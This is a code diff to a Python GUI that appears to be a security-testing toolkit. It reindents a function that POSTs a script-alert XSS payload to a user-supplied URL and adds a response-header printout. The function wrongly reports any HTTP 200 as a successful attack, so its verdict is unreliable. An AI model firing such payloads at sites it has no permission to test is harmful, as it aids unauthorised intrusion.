@@ -63,32 +63,34 @@ class MenuGUI:
             report_file.write("</body></html>")
         messagebox.showinfo("Report Generated", f"HTML report for {category} has been generated: {report_filename}")
 
-def perform_xss_attack(self):
-    url = simpledialog.askstring("XSS Tracer", "Enter the URL to perform XSS attack on:")
-    if url:
-        # Define the XSS payload
-        payload = "<script>alert('XSS Attack!')</script>"
+    def perform_xss_attack(self):
+        url = simpledialog.askstring("XSS Tracer", "Enter the URL to perform XSS attack on:")
+        if url:
+            # Define the XSS payload
+            payload = "<script>alert('XSS Attack!')</script>"
 
-        # Create the form data with the XSS payload
-        form_data = {
-            "input_field": payload
-        }
+            # Create the form data with the XSS payload
+            form_data = {
+                "input_field": payload
+            }
 
-        print(f"Sending POST request to: {url}")
-        print(f"Headers: {requests.headers}")
-        print(f"Data: {form_data}")
+            print(f"Sending POST request to: {url}")
+            print(f"Data: {form_data}")
 
-        try:
-            # Send the POST request with the form data
-            response = requests.post(url, data=form_data)
+            try:
+                # Send the POST request with the form data
+                response = requests.post(url, data=form_data)
 
-            # Check if the request was successful
-            if response.status_code == 200:
-                print("XSS Attack successful!")
-            else:
-                print("XSS Attack failed. Status code:", response.status_code)
-        except requests.exceptions.RequestException as e:
-            print("An error occurred:", e)
+                # Print the response headers
+                print(f"Response Headers: {response.headers}")
+
+                # Check if the request was successful
+                if response.status_code == 200:
+                    print("XSS Attack successful!")
+                else:
+                    print("XSS Attack failed. Status code:", response.status_code)
+            except requests.exceptions.RequestException as e:
+                print("An error occurred:", e)
 
     def wpscan_scan(self):
         site_url = simpledialog.askstring("Wordpress", "Enter the Wordpress site URL:")
